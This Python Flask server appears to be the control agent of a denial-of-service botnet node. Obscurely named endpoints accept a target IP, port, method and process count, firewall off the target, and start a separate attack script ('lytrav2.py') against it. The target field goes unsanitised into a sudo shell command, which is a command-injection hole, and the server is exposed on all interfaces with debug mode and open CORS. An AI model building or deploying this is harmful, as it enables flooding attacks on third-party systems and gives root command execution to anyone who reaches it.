from flask import Flask, jsonify, request
import subprocess
import psutil
from flask_cors import CORS


app = Flask(__name__)
CORS(app)

python_process = None
myID = None
bootingIP = None

@app.route('/reim', methods=['POST'])
def start_script():
    global python_process
    global myID
    global bootingIP

    if python_process is not None and python_process.poll() is None:
        return jsonify(error='Python script is already running'), 400

    try:
        data = request.get_json()
        # print(data)

        bootingIP = data["trg"]
        dropCommand = f"sudo iptables -A INPUT -s {data['trg']} -j DROP"
        subprocess.run(dropCommand, shell=True)


        python_process = subprocess.Popen(['python3', 'lytrav2.py', f'{data["method"]}', f'{data["trg"]}', f'{data["port"]}', f'{data["processes"]}'])
        myID = data['id']
        

        return jsonify(message=f'Lyta {data["id"]} Started!')
    except Exception as e:
        return jsonify(error=str(e)), 500

@app.route('/hyud', methods=['POST'])
def stop_script():
    global python_process
    global myID
    global bootingIP

    removeDropCommand = f"sudo iptables -D INPUT -s {bootingIP} -j DROP"
    subprocess.run(removeDropCommand, shell=True)

    if python_process is None or python_process.poll() is not None:
        return jsonify(error='No running Python script to stop'), 400

    try:
        process = psutil.Process(python_process.pid)
        for child in process.children(recursive=True):
            child.terminate()
        python_process.terminate()
        python_process.wait()
        python_process = None
        return jsonify(message=f'Lytra {myID} Stopped')
    except Exception as e:
        return jsonify(error=str(e)), 500

@app.route('/sanityCheck', methods=['POST'])
def sanityCheck():
    return jsonify({"stauts" : "200"})

if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0", port=80)
